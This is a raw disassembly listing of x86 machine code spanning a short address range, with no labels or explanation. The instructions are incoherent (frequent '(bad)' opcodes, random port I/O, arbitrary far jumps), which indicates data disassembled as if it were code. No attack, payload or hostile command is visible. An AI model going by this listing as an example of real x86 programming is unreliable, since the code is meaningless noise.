  4135cd:	xor    al,0x29
  4135cf:	cli    
  4135d0:	mov    al,0xd3
  4135d2:	add    al,0x7
  4135d4:	nop
  4135d5:	or     eax,0xd54ce6bb
  4135da:	push   edi
  4135db:	ins    BYTE PTR es:[edi],dx
  4135dc:	inc    edx
  4135dd:	shrd   edx,esi,0x5
  4135e1:	push   di
  4135e3:	sub    eax,DWORD PTR [edi+ecx*4]
  4135e6:	in     al,0x41
  4135e8:	adc    eax,0x45ac2ea7
  4135ed:	inc    esi
  4135ee:	or     eax,0x6fd55e78
  4135f3:	xor    eax,0x4b86396f
  4135f8:	stc    
  4135f9:	ins    DWORD PTR es:[edi],dx
  4135fa:	dec    ecx
  4135fc:	fcom   st(1)
  4135fe:	imul   DWORD PTR [edi]
  413600:	mov    ds:0xf84559d2,al
  413605:	mov    eax,fs:0x82376eb5
  41360b:	aaa    
  41360c:	push   cs
  41360d:	sbb    al,0xe8
  41360f:	jp     0x413671
  413611:	dec    ebp
  413612:	int    0x5b
  413614:	jge    0x4135b2
  413616:	sub    BYTE PTR [edx+0x615adbd9],0x68
  41361d:	enter  0x5322,0xd8
  413621:	jp     0x413609
  413623:	jns    0x4135b7
  413625:	inc    ebp
  413626:	dec    edx
  413627:	pop    esi
  413628:	xor    al,0xbf
  41362a:	sub    al,0x93
  41362c:	add    bl,BYTE PTR [edi]
  41362e:	aas    
  41362f:	add    DWORD PTR [ebp-0x5f],eax
  413632:	dec    DWORD PTR [edx+0x447f0ba5]
  413638:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413639:	stos   DWORD PTR es:[edi],eax
  41363a:	mov    eax,0x46b1eca
  41363f:	xchg   ebp,eax
  413640:	ret    
  413641:	jle    0x413695
  413643:	out    dx,eax
  413644:	jle    0x4135df
  413646:	xchg   esi,eax
  413647:	retf   0x802b
  41364a:	push   es
  41364b:	ret    0xc96c
  41364e:	xchg   edi,eax
  41364f:	jp     0x413677
  413651:	ins    BYTE PTR es:[edi],dx
  413652:	icebp  
  413653:	adc    BYTE PTR [esp+edx*4-0x59],0x22
  413658:	lock imul edi,DWORD PTR cs:[edx],0x63
  41365d:	sbb    esi,edx
  41365f:	or     BYTE PTR ds:0x59552e9d,cl
  413665:	sbb    ch,BYTE PTR [ecx+0x680b4701]
  41366b:	inc    ebx
  41366c:	ins    BYTE PTR es:[edi],dx
  41366d:	jg     0x41368e
  41366f:	adc    al,BYTE PTR [ebx-0x598c55fb]
  413675:	out    dx,al
  413676:	pop    esp
  413677:	loopne 0x41368c
  413679:	test   DWORD PTR [edi+edi*1-0x34c1fd7b],ecx
  413680:	add    eax,DWORD PTR [esi]
  413682:	xor    eax,DWORD PTR [ecx]
  413684:	push   0x9a2954d2
  413689:	ins    BYTE PTR es:[edi],dx
  41368a:	inc    edx
  41368b:	(bad)  
  41368c:	mov    al,0x43
  41368e:	leave  
  41368f:	push   ebp
  413690:	xor    DWORD PTR [edi+0x5a],ecx
  413693:	push   edx
  413694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413695:	mov    eax,ds:0x21020776
  41369a:	ins    DWORD PTR es:[edi],dx
  41369b:	aad    0xf1
  41369d:	mov    ecx,0x3c55af92
  4136a2:	jbe    0x413681
  4136a4:	xlat   BYTE PTR ds:[ebx]
  4136a5:	sbb    eax,0xd4f27d46
  4136aa:	cmp    eax,0x726f9f4e
  4136af:	push   ds
  4136b0:	dec    esi
  4136b1:	mov    bh,0xbc
  4136b3:	add    eax,DWORD PTR [ebx+eax*8+0x40]
  4136b7:	xchg   esp,eax
  4136b8:	push   ebx
  4136b9:	out    dx,eax
  4136ba:	cmp    bh,bl
  4136bc:	mov    dh,0x14
  4136be:	cmc    
  4136bf:	pushf  
  4136c0:	pop    edi
  4136c1:	ds jno 0x4136ce
  4136c4:	push   ebp
  4136c5:	mov    edi,0xe5701ee4
  4136ca:	xor    dh,bh
  4136cc:	mov    cl,0x53
  4136ce:	(bad)  
  4136cf:	adc    eax,0x6d147930
  4136d4:	dec    ebp
  4136d5:	pushf  
  4136d6:	pop    es
  4136d7:	adc    bl,dl
  4136d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136da:	rcl    BYTE PTR [esp+ebp*8-0x6f7dfc52],cl
  4136e1:	leave  
  4136e2:	ss iret 
  4136e4:	xchg   ecx,eax
  4136e5:	sub    DWORD PTR [ebx],ebp
  4136e7:	arpl   bp,bp
  4136e9:	(bad)  [ebp+ecx*1-0x4d583287]
  4136f0:	cli    
  4136f1:	lods   eax,DWORD PTR ds:[esi]
  4136f2:	fist   WORD PTR ds:0xeb000a11
  4136f8:	and    BYTE PTR [esi],dl
  4136fa:	add    eax,0x20ec1060
  4136ff:	int    0x98
  413701:	test   esi,0x919dbb1d
  413707:	cmp    al,0x3d
  413709:	ins    DWORD PTR es:[edi],dx
  41370a:	jle    0x413707
  41370c:	or     BYTE PTR [ecx-0x4e],dh
  41370f:	jne    0x4136e0
  413711:	nop    edi
  413714:	inc    ebp
  413715:	inc    esp
  413716:	arpl   WORD PTR [ecx],cx
  413718:	jl     0x41371e
  41371a:	int3   
  41371b:	pop    esi
  41371c:	pop    es
  41371d:	mov    edx,ebp
  41371f:	shl    BYTE PTR [ebx-0x1f],1
  413722:	sbb    esi,DWORD PTR [esi]
  413724:	pop    es
  413725:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413726:	sub    ch,dl
  413728:	mov    ebp,0x74abc461
  41372d:	sub    DWORD PTR [ebx-0x1ada957f],0xc6a91c5
  413737:	loopne 0x41373d
  413739:	sti    
  41373a:	std    
  41373b:	dec    esi
  41373c:	dec    eax
  41373d:	mov    esp,0xe3f7da0c
  413742:	cld    
  413743:	jg     0x413796
  413745:	mov    cl,0xc4
  413747:	mov    bl,0xff
  413749:	jmp    0x413760
  41374b:	jb     0x41375c
  41374d:	mov    eax,edx
  41374f:	packuswb mm3,mm0
  413752:	loop   0x4137b0
  413754:	je     0x4137c1
  413756:	cmc    
  413757:	in     eax,dx
  413758:	mov    WORD PTR [ebx-0x6],gs
  41375b:	(bad)  
  41375c:	mov    al,0x9c
  41375e:	pusha  
  41375f:	push   esi
  413760:	sbb    DWORD PTR [ebx],eax
  413762:	cmp    esp,DWORD PTR [ebx+0x521d860f]
  413768:	outs   dx,DWORD PTR ds:[esi]
  413769:	pop    esp
  41376a:	scas   al,BYTE PTR es:[edi]
  41376b:	xor    dl,BYTE PTR [ebx]
  41376d:	fild   QWORD PTR [ecx]
  41376f:	cmp    eax,0xf756a27e
  413774:	inc    ecx
  413775:	pop    ds
  413776:	pop    eax
  413777:	cmp    al,0xd0
  413779:	push   cs
  41377a:	das    
  41377b:	mov    eax,0xf3f15a02
  413780:	pop    edx
  413781:	push   edx
  413782:	and    DWORD PTR ds:0x1e64bb6d,0xffffffea
  413789:	mov    dl,BYTE PTR [ebp-0x43e72aac]
  41378f:	push   edi
  413790:	inc    ebp
  413791:	mov    DWORD PTR [eax],edi
  413793:	cmp    al,0xe
  413795:	push   cs
  413796:	mov    BYTE PTR [ecx+eax*1-0x29747bba],dh
  41379d:	pop    ss
  41379e:	mov    ds:0x2da6886e,eax
  4137a3:	loop   0x413803
  4137a5:	daa    
  4137a6:	add    dl,ch
  4137a8:	sub    DWORD PTR [edx-0x25],eax
  4137ab:	cmc    
  4137ac:	xchg   ebp,eax
  4137ad:	and    ah,ch
  4137af:	cli    
  4137b0:	sti    
  4137b1:	pop    ss
  4137b2:	jg     0x413770
  4137b4:	les    esi,FWORD PTR [eax]
  4137b6:	mov    dh,0xa3
  4137b8:	shr    DWORD PTR fs:[ecx+ebp*4-0x24],0xca
  4137be:	out    0x11,al
  4137c0:	xor    edx,eax
  4137c2:	cdq    
  4137c3:	jl     0x4137a1
  4137c5:	scas   al,BYTE PTR es:[edi]
  4137c6:	dec    eax
  4137c7:	rcl    DWORD PTR [edi-0x75b1f7ca],cl
  4137cd:	adc    DWORD PTR [esi-0x20e265a9],ecx
  4137d3:	jae    0x41379e
  4137d5:	dec    edx
  4137d6:	xchg   ecx,eax
  4137d7:	jp     0x413856
  4137d9:	jne    0x413842
  4137db:	add    DWORD PTR [ebx],esi
  4137dd:	adc    bh,BYTE PTR [ecx]
  4137df:	inc    edi
  4137e0:	and    BYTE PTR [eax+0x30],0xcf
  4137e4:	sub    dl,BYTE PTR [esi]
  4137e6:	fwait
  4137e7:	mov    WORD PTR [eax+0x251302cd],?
  4137ed:	push   ecx
  4137ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137ef:	cmp    DWORD PTR [ecx],ebx
  4137f1:	jge    0x413837
  4137f3:	aaa    
  4137f4:	arpl   WORD PTR [eax+0x3a],si
  4137f7:	popf   
  4137f8:	push   esp
  4137f9:	retf   
  4137fa:	pop    es
  4137fb:	xchg   esp,eax
  4137fc:	inc    esp
  4137fd:	or     bh,BYTE PTR [edi]
  4137ff:	cmp    BYTE PTR [ebp+edx*4-0x27853d7b],ch
  413806:	cmp    eax,0x81666421
  41380b:	inc    ebx
  41380c:	fwait
  41380d:	add    dl,BYTE PTR [esi+0x4]
  413810:	push   0xdb113df2
  413815:	pop    ss
  413816:	cmp    al,0x4f
  413818:	mov    edx,0xdec3abc7
  41381d:	push   esi
  41381e:	jecxz  0x41385c
  413820:	stc    
  413821:	jns    0x4137ae
  413823:	cdq    
  413824:	(bad)  
  413825:	cmp    eax,0xf874b996
  41382a:	hlt    
  41382b:	les    esi,FWORD PTR [ebp-0x1a4bb22d]
  413831:	in     eax,dx
  413832:	test   eax,0xbfa46da4
  413837:	frstor [ebp-0x65]
  41383a:	das    
  41383b:	mov    ebx,0x8429e046
  413840:	mov    ds:0x8df09c93,al
  413845:	(bad)  
  413846:	jae    0x413895
  413848:	pop    ebp
  413849:	nop
  41384a:	xor    ebx,DWORD PTR [ebx-0x2b651375]
  413850:	sahf   
  413851:	aam    0xe1
  413853:	out    0x9,al
  413855:	sti    
  413856:	xchg   ebp,eax
  413857:	and    edx,DWORD PTR [ebx+0x16a05c93]
  41385d:	std    
  41385e:	mov    ebx,0x840b8c39
  413863:	stos   DWORD PTR es:[edi],eax
  413864:	cmp    BYTE PTR [edx],ch
  413866:	dec    ecx
  413867:	xlat   BYTE PTR ds:[ebx]
  413868:	sub    esp,edx
  41386a:	push   0x6d8902b5
  41386f:	bound  ecx,QWORD PTR [ebx+0x9]
  413872:	add    bl,0xdb
  413875:	ret    0x9422
  413878:	jne    0x413802
  41387a:	dec    edx
  41387b:	sub    al,BYTE PTR [edx+eiz*1+0x6750aadf]
  413882:	xor    esi,esp
  413884:	fcmovnbe st,st(4)
  413886:	out    0xab,al
  413888:	push   eax
  413889:	sub    al,0x15
  41388b:	mov    edx,0x6d178727
  413890:	adc    dl,BYTE PTR [edx]
  413892:	pop    es
  413893:	out    dx,eax
  413894:	out    0x5f,eax
  413896:	mov    BYTE PTR [ebx+0x4779f67f],ah
  41389c:	in     eax,0x4e
  41389e:	scas   eax,DWORD PTR es:[edi]
  41389f:	sar    BYTE PTR [eax-0x26],0xf5
  4138a3:	pushf  
  4138a4:	les    ebx,FWORD PTR [edx+0x65]
  4138a7:	cmc    
  4138a8:	(bad)  
  4138a9:	out    0xf3,al
  4138ab:	mov    ax,0xa851
  4138af:	jno    0x41392d
  4138b1:	xor    al,0x75
  4138b3:	cwde   
  4138b4:	retf   
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	pushf  
  4138b7:	and    DWORD PTR [ecx+ebp*2],0xb59475a6
  4138be:	cld    
  4138bf:	int3   
  4138c0:	xchg   ecx,eax
  4138c1:	pop    esp
  4138c2:	xor    ecx,ebp
  4138c4:	pop    ds
  4138c5:	add    BYTE PTR [ebx],bh
  4138c7:	mov    eax,0x2232ef65
  4138cc:	adc    dl,ch
  4138ce:	adc    ebx,esp
  4138d0:	xchg   ebx,eax
  4138d1:	fiadd  DWORD PTR [edx+edi*1+0x1c2a5b49]
  4138d8:	mov    ebp,0x56ff0c81
  4138dd:	mov    edi,0x796099d
  4138e2:	loop   0x4138e5
  4138e4:	stc    
  4138e5:	mov    ds,WORD PTR [eax+0x70]
  4138e8:	xchg   esp,eax
  4138e9:	imul   edi
  4138eb:	fucomi st,st(1)
  4138ed:	retf   0x3b38
  4138f0:	sub    eax,0x34508fcb
  4138f5:	inc    edx
  4138f6:	lds    ebp,FWORD PTR [esp]
  4138f9:	pop    ds
  4138fa:	sahf   
  4138fb:	pop    esp
  4138fc:	shl    DWORD PTR [ebx+ebp*8],0xea
  413900:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413901:	(bad)  
  413902:	(bad)
  413905:	sbb    eax,0x49d2515
  41390a:	sahf   
  41390b:	jmp    0x413925
  41390d:	or     al,0x9f
  41390f:	std    
  413910:	retf   0x7345
  413913:	aam    0x6b
  413915:	lea    esp,cs:[edi+0x48]
  413919:	mov    dh,0x67
  41391b:	pop    ecx
  41391c:	fcom   DWORD PTR [eax+0x74ca8279]
  413922:	test   eax,0xcc5e2ac2
  413927:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413928:	mov    cs,WORD PTR [edi]
  41392a:	mov    eax,ds:0x1724da19
  41392f:	jl     0x4138d8
  413931:	jne    0x41391e
  413933:	loope  0x4138f5
  413935:	mov    bh,0xd3
  413937:	jb     0x41397d
  413939:	adc    eax,0x17d67c20
  41393e:	imul   ebx,DWORD PTR [eax+0x43],0x7e5ab8a9
  413945:	pushf  
  413946:	mov    DWORD PTR [esp+edx*2+0x74],0x4f7504dc
  41394e:	lahf   
  41394f:	add    eax,0xabacc53e
  413954:	xor    al,BYTE PTR [esi+0x34de5f8]
  41395a:	xchg   edx,eax
  41395b:	mov    fs,WORD PTR [ebp+0x78b632c5]
  413961:	in     al,dx
  413962:	inc    ebp
  413963:	call   0x1bcd:0x22016a95
  41396a:	je     0x4139bd
  41396c:	jecxz  0x413994
  41396e:	lock push esi
  413970:	pop    ebp
  413971:	sbb    BYTE PTR [esi-0x25a1d395],ch
  413977:	pop    edi
  413978:	xchg   edx,eax
  413979:	cld    
  41397a:	mov    dl,0x71
  41397c:	daa    
  41397d:	loop   0x41391e
  41397f:	adc    esi,ecx
  413981:	retf   0xa3c1
  413984:	lods   al,BYTE PTR ds:[esi]
  413985:	popf   
  413986:	dec    ebx
  413987:	mov    al,0xdd
  413989:	(bad)  
  41398b:	daa    
  41398c:	jmp    0x4139be
  41398e:	clc    
  41398f:	hlt    
  413990:	or     DWORD PTR [esi],0x40
  413993:	dec    ebx
  413994:	adc    edx,DWORD PTR [edx+esi*1-0x71]
  413998:	fwait
  413999:	mov    al,ds:0xd5ab385c
  41399e:	leave  
  41399f:	mov    eax,0x1b90d5bb
  4139a4:	fsub   DWORD PTR [ecx+0x51c12f2f]
  4139aa:	popf   
  4139ab:	sub    edx,esi
  4139ad:	shr    BYTE PTR [ebp+0x6c],1
  4139b0:	sbb    al,0x28
  4139b2:	shl    BYTE PTR [ecx+0x37],0x96
  4139b6:	xchg   edi,eax
  4139b7:	add    BYTE PTR [esi-0x42],bh
  4139ba:	mov    esp,0xd108152d
  4139bf:	ret    0x8d61
  4139c2:	sbb    bh,cl
  4139c4:	pop    eax
  4139c5:	fnstsw WORD PTR [edi+0x3de5134f]
  4139cb:	pop    ecx
  4139cc:	ret    
  4139cd:	or     bh,cl
  4139cf:	and    edx,DWORD PTR [esi]
  4139d1:	and    al,0x40
  4139d3:	call   0xece5efbe
  4139d8:	retf   0x8c62
  4139db:	int    0x20
  4139dd:	pop    esp
  4139de:	fs and cl,ch
  4139e1:	sub    eax,0xab2f71bb
  4139e6:	pop    ecx
  4139e7:	fiadd  WORD PTR [esi-0x2a5086ce]
  4139ed:	inc    ebp
  4139ee:	(bad)  
  4139ef:	sub    eax,0xe354d1db
  4139f4:	cmp    eax,0x8ca764e8
  4139f9:	(bad)  
  4139fa:	or     ecx,edi
  4139fc:	enter  0xc6ab,0x7b
  413a00:	mov    ebx,esp
  413a02:	sub    DWORD PTR [ecx],edi
  413a04:	popa   
  413a05:	loopne 0x413a28
  413a07:	mov    ebp,0x4130462a
  413a0c:	mov    al,ds:0x2cab7321
  413a11:	xchg   edx,eax
  413a12:	push   ebp
  413a13:	fmul   QWORD PTR [edx+0x66c9f6b1]
  413a19:	xor    BYTE PTR [ebx+0x45],bl
  413a1c:	arpl   cx,ax
  413a1e:	mov    ds:0xee8d5af2,eax
  413a23:	and    eax,esi
  413a25:	(bad)  
  413a28:	in     eax,dx
  413a29:	add    BYTE PTR [esi+ebx*2],dl
  413a2c:	repz sbb DWORD PTR [edx],edx
  413a2f:	mul    ah
  413a31:	sub    bh,BYTE PTR [ebx+0x5830cdea]
  413a37:	mov    cl,BYTE PTR [ecx+0x78]
  413a3a:	and    al,0x1b
  413a3c:	je     0x413a50
  413a3e:	cmp    DWORD PTR [edi-0x2a],esi
  413a41:	out    dx,eax
  413a42:	pop    ds
  413a43:	pop    ss
  413a44:	lahf   
  413a45:	dec    ebp
  413a46:	inc    eax
  413a47:	jnp    0x413a40
  413a49:	and    esp,esp
  413a4b:	xchg   esp,eax
  413a4c:	inc    ebp
  413a4d:	and    eax,0xd4c69c08
  413a52:	or     esp,edx
  413a54:	add    al,0xfa
  413a56:	dec    esi
  413a57:	sbb    dh,bl
  413a59:	jb     0x413ac5
  413a5b:	ficomp DWORD PTR [eax]
  413a5d:	mov    ecx,0x7f910867
  413a62:	sbb    eax,0xadab0c3d
  413a67:	cs xchg ebp,eax
  413a69:	stc    
  413a6a:	mov    ah,0xa4
  413a6c:	pop    ecx
  413a6d:	pop    ecx
  413a6e:	jbe    0x413ad8
  413a70:	out    0x7f,al
  413a72:	or     eax,DWORD PTR [ebp-0x2c]
  413a75:	popa   
  413a76:	adc    DWORD PTR [eax],ebp
  413a78:	scas   eax,DWORD PTR es:[edi]
  413a79:	mov    esp,0xb2d1624
  413a7e:	in     eax,0x54
  413a80:	(bad)  
  413a81:	mov    ah,0xc8
  413a83:	push   0xffffffcd
  413a85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a86:	cs leave 
  413a88:	push   0x16
  413a8a:	imul   cx,cx,0xff91
  413a8e:	and    ebx,ebx
  413a90:	pop    esp
  413a91:	xchg   ebx,eax
  413a92:	push   0x2
  413a94:	cmp    ch,BYTE PTR [edx-0x7f88b0a3]
  413a9a:	ror    BYTE PTR [edi-0x22a76cd3],1
  413aa0:	fs fwait
  413aa2:	mov    edx,0xd838cf5
  413aa7:	arpl   WORD PTR [eax+0xf],ax
  413aaa:	pushf  
  413aab:	sti    
  413aac:	xlat   BYTE PTR ds:[ebx]
  413aad:	dec    ebp
  413aae:	push   esp
  413aaf:	loopne 0x413aae
  413ab1:	sbb    cl,cl
  413ab3:	push   esi
  413ab4:	sbb    al,BYTE PTR [ecx-0x6242ce2f]
  413aba:	das    
  413abb:	cmp    DWORD PTR [di-0x73],0xbad298b4
  413ac3:	out    0x7c,eax
  413ac5:	mov    bl,ah
  413ac7:	popa   
  413ac8:	mov    edi,0x84c27a63
  413acd:	cmp    eax,0x59e73da2
  413ad2:	scas   eax,DWORD PTR es:[edi]
  413ad3:	or     ah,BYTE PTR [esi]
  413ad5:	(bad)  
  413ad6:	aaa    
  413ad7:	stc    
  413ad8:	repnz pop ds
  413ada:	xrelease mov BYTE PTR [ebx],ah
  413add:	cmp    eax,0x6b304023
  413ae2:	je     0x413adc
  413ae4:	addr16 in al,dx
  413ae6:	ins    DWORD PTR es:[edi],dx
  413ae7:	fld    DWORD PTR [eax-0x7f4f9b13]
  413aed:	mov    al,ds:0x8a1b2a8b
  413af2:	mov    eax,ds:0x15ba4ac5
  413af7:	jmp    0x5526:0xbd1a42f4
  413afe:	inc    edx
  413aff:	cld    
  413b00:	fs jne 0x413a8f
  413b03:	dec    ebp
  413b04:	push   ebp
  413b05:	outs   dx,BYTE PTR ds:[esi]
  413b06:	fisubr DWORD PTR [edx+0x7d]
  413b09:	sub    edx,ebp
  413b0b:	dec    ecx
  413b0c:	call   0x2311:0x559b8a41
  413b13:	mov    esp,DWORD PTR ds:0x3034f277
  413b19:	mov    ch,0xf8
  413b1b:	add    ch,ch
  413b1d:	fbstp  TBYTE PTR [esi+eax*1+0x24561ec7]
  413b24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b25:	(bad)
  413b2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b2b:	loopne 0x413b19
  413b2d:	and    eax,0x40e497dd
  413b32:	retf   0xb27a
  413b35:	sbb    DWORD PTR [eax+ebx*1+0x2237ed81],0xffffffdf
  413b3d:	fstp   st(0)
  413b3f:	sbb    eax,0x8a8f00e9
  413b44:	mov    ds:0xcd464c15,al
  413b49:	sar    BYTE PTR [ebx-0x544e85d9],0x9f
  413b50:	test   eax,0x8233f835
  413b55:	mov    DWORD PTR [esi],0x653f0c8f
  413b5b:	dec    edi
  413b5c:	fyl2xp1 
  413b5e:	rcr    DWORD PTR [ecx+0x4019c917],cl
  413b64:	lods   eax,DWORD PTR ds:[esi]
  413b65:	push   cs
  413b66:	cmp    eax,0xef802c84
  413b6b:	lahf   
  413b6c:	outs   dx,DWORD PTR ds:[esi]
  413b6d:	clc    
  413b6e:	jp     0x413b8f
  413b70:	cmp    al,0x8a
  413b72:	stc    
  413b73:	inc    eax
  413b74:	dec    esp
  413b75:	pop    eax
  413b76:	dec    ebp
  413b77:	in     eax,dx
  413b78:	nop
  413b79:	popf   
  413b7a:	push   ecx
  413b7b:	icebp  
  413b7c:	jmp    0x822bf925
  413b81:	aam    0x7e
  413b83:	jmp    0xf140:0xeafe4717
  413b8a:	pop    esp
  413b8b:	mov    ch,0x5a
  413b8d:	outs   dx,DWORD PTR ds:[esi]
  413b8e:	outs   dx,DWORD PTR ds:[esi]
  413b8f:	push   esi
  413b90:	adc    eax,0x48147a2a
  413b95:	clc    
  413b96:	mov    ebp,0x7d962566
  413b9b:	lods   al,BYTE PTR ds:[esi]
  413b9c:	pop    ecx
  413b9d:	fst    DWORD PTR [ecx-0x2c]
  413ba0:	adc    eax,0x59b098f1
  413ba5:	xor    esi,DWORD PTR [ecx]
  413ba7:	mov    edx,0x63f200a5
  413bac:	rcl    edx,0x7a
  413baf:	bound  edx,QWORD PTR [esi]
  413bb1:	nop
  413bb2:	push   esp
  413bb3:	adc    al,0x95
  413bb5:	(bad)  
  413bb6:	leave  
  413bb7:	inc    edi
  413bb8:	outs   dx,BYTE PTR ds:[esi]
  413bb9:	mov    WORD PTR [ebp+ebp*4-0x73],?
  413bbd:	aas    
  413bbe:	push   eax
  413bbf:	jo     0x413c21
  413bc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bc2:	popa   
  413bc3:	sub    dl,0xda
  413bc6:	sbb    cl,al
  413bc8:	jo     0x413b7b
  413bca:	pusha  
  413bcb:	and    DWORD PTR ds:0xeba87545,0x1c
  413bd2:	sar    bh,0xb5
  413bd5:	or     DWORD PTR [edi],eax
  413bd7:	lods   eax,DWORD PTR ds:[esi]
  413bd8:	sub    BYTE PTR [ebx],ah
  413bda:	in     al,dx
  413bdb:	xor    cl,BYTE PTR [ebp+eiz*4+0x62059f2a]
  413be2:	iret   
  413be3:	into   
  413be4:	std    
  413be5:	xchg   esi,eax
  413be6:	test   eax,0x7326aa0
  413beb:	sbb    ch,0x49
  413bee:	lea    esp,[ebx-0x1b7110ff]
  413bf4:	ss ffree st(2)
  413bf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bf8:	rcl    BYTE PTR [edx-0x40082813],1
  413bfe:	lods   eax,DWORD PTR ds:[esi]
  413bff:	pop    esp
  413c00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c01:	dec    esi
  413c02:	and    al,0x84
  413c04:	sahf   
  413c05:	pop    edx
  413c06:	ret    
  413c07:	dec    esp
  413c08:	out    dx,al
  413c09:	(bad)  
  413c0a:	fst    QWORD PTR [ebp-0x6c1c1744]
  413c10:	stos   DWORD PTR es:[edi],eax
  413c11:	cs xchg edx,eax
  413c13:	jne    0x413c2d
  413c15:	js     0x413c2f
  413c17:	sbb    eax,0x485a4ca6
  413c1c:	or     BYTE PTR [ebx+0x38],ch
  413c1f:	dec    ebx
  413c20:	and    esp,DWORD PTR [edx+edi*2]
  413c23:	into   
  413c24:	xor    al,0x19
  413c26:	mov    al,0xe
  413c28:	mov    gs,WORD PTR [ebx+0x58]
  413c2b:	jo     0x413c40
  413c2d:	ds pop esp
  413c2f:	cmp    eax,DWORD PTR [ecx]
  413c31:	and    ebx,ebx
  413c33:	or     WORD PTR [eax+edi*8],ax
  413c37:	or     eax,0xef42d181
  413c3c:	xor    DWORD PTR [eax+0x209e8dc],ebp
  413c42:	scas   al,BYTE PTR es:[edi]
  413c43:	ds out 0x87,al
  413c46:	sub    al,0x4d
  413c48:	sub    edx,ebp
  413c4a:	daa    
  413c4b:	mov    ah,0xc5
  413c4d:	pop    ecx
  413c4e:	dec    ebp
  413c4f:	jbe    0x413c2a
  413c51:	lods   eax,DWORD PTR ds:[esi]
  413c52:	jns    0x413cc4
  413c54:	not    DWORD PTR [eax-0x7f]
  413c57:	adc    dh,BYTE PTR ds:0xa1b7f082
  413c5d:	mov    eax,ds:0x2b202831
  413c62:	shl    DWORD PTR [esi-0x73],1
  413c65:	shr    DWORD PTR [ecx],1
  413c67:	jle    0x413c1c
  413c69:	or     esp,0x51
  413c6c:	dec    esi
  413c6d:	or     BYTE PTR [bx+di-0x596f],ah
  413c72:	ja     0x413c46
  413c74:	and    DWORD PTR [edx],edx
  413c76:	sub    eax,0xc050e597
  413c7b:	add    al,0x80
  413c7d:	inc    BYTE PTR [edi]
  413c7f:	shl    BYTE PTR [ecx+eiz*8+0x3f],1
  413c83:	leave  
  413c84:	out    0x43,eax
  413c86:	pushf  
  413c87:	arpl   WORD PTR [esi],di
  413c89:	data16 (bad) 
  413c8b:	call   0xe82e7b7c
  413c90:	stos   BYTE PTR es:[edi],al
  413c91:	jg     0x413c26
  413c93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c94:	sub    BYTE PTR [esi],0x2a
  413c97:	mov    cl,0x69
  413c99:	inc    esp
  413c9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c9b:	xor    cl,bl
  413c9d:	clc    
  413c9e:	sub    cl,BYTE PTR [eax+0x2e434b56]
  413ca4:	inc    esp
  413ca5:	xchg   edi,eax
  413ca6:	jo     0x413c80
  413ca8:	xchg   ecx,eax
  413ca9:	xchg   edx,eax
  413caa:	push   eax
  413cab:	cmp    esp,DWORD PTR [eax]
  413cad:	inc    esi
  413cae:	pop    ecx
  413caf:	sub    eax,0xf58cdf43
  413cb4:	fwait
  413cb5:	mov    ds:0x18f8e3b2,eax
  413cba:	cdq    
  413cbb:	adc    DWORD PTR [ebx],edi
  413cbd:	into   
  413cbe:	push   ds
  413cbf:	sbb    BYTE PTR [ebx-0x41],al
  413cc2:	mov    esp,0xecb56b67
  413cc7:	std    
  413cc8:	sub    DWORD PTR [ecx+0x1c],ecx
  413ccb:	inc    ebp
  413ccc:	out    0xa7,al
  413cce:	daa    
  413ccf:	sbb    BYTE PTR [ebx+0x7f164806],al
  413cd5:	xchg   ecx,eax
  413cd6:	jmp    0x8b45a880
  413cdb:	xchg   esi,eax
  413cdc:	pop    ss
  413cdd:	mov    bl,0xc3
  413cdf:	loop   0x413d4d
  413ce1:	mov    WORD PTR ds:0xb5151bbb,gs
  413ce7:	xchg   esp,eax
  413ce8:	iret   
  413ce9:	pop    esi
  413cea:	nop
  413ceb:	adc    eax,edi
  413ced:	and    DWORD PTR [esi+esi*4+0xbdaf863],eax
  413cf4:	jbe    0x413d71
  413cf6:	push   0xd448b5e
  413cfb:	inc    edx
  413cfc:	mov    edx,0xe8be3d23
  413d01:	sub    DWORD PTR [edi+0x2367ce86],edx
  413d07:	sub    al,ch
  413d09:	ret    
  413d0a:	out    dx,eax
  413d0b:	hlt    
  413d0c:	push   cs
  413d0d:	inc    ecx
  413d0e:	mov    bl,0xd8
  413d10:	les    ebx,FWORD PTR ds:0xb8136d6f
  413d16:	push   ss
  413d17:	fisub  DWORD PTR [ebx]
  413d19:	fdiv   QWORD PTR [eax+0x23715d2c]
  413d1f:	xor    DWORD PTR [bx+si],ecx
  413d22:	sbb    DWORD PTR [edi+0x317d6677],ebx
  413d28:	mov    DWORD PTR [esi-0xfba7c30],ebx
  413d2e:	jbe    0x413ce9
  413d30:	xchg   esi,eax
  413d31:	adc    al,0x85
  413d33:	fimul  DWORD PTR [eax+0x79]
  413d36:	shr    DWORD PTR [ebx+0x48ea622a],cl
  413d3c:	sahf   
  413d3d:	push   es
  413d3e:	add    al,0x60
  413d40:	push   edi
  413d41:	pop    ebp
  413d42:	lods   eax,DWORD PTR ds:[esi]
  413d43:	push   ebp
  413d44:	cmp    al,0x39
  413d46:	sbb    al,0x4e
  413d48:	cmp    DWORD PTR [edx],ebx
  413d4a:	or     ah,BYTE PTR [ebx-0x35d5787f]
  413d50:	jbe    0x413d87
  413d52:	(bad)  
  413d53:	pop    ds
  413d54:	lods   eax,DWORD PTR ds:[esi]
  413d55:	shl    esi,cl
  413d57:	push   ebx
  413d58:	and    eax,0xfd8e8d7c
  413d5d:	jae    0x413dac
  413d5f:	call   0x99d73176
  413d64:	fnstcw WORD PTR [esi-0x4d6a9541]
  413d6a:	fstp   DWORD PTR [eax]
  413d6c:	cmp    al,0x1c
  413d6e:	ret    
  413d6f:	inc    eax
  413d70:	mov    eax,0x489e5e0f
  413d75:	hlt    
  413d76:	mov    eax,ds:0x7f0f0eb1
  413d7b:	sub    eax,0x30e1f863
